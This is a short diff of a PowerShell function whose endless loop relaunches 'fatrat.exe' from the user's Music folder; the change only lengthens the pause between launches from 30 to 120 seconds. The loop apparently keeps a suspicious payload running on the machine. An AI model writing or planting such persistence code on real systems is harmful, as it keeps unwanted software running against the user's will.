@@ -5,7 +5,7 @@ function Do-A {
 
     while ($true) {
     Start-Process "$env:USERPROFILE\Music\fatrat.exe"
-    Start-Sleep -Seconds 30
+    Start-Sleep -Seconds 120
 }
 
 }
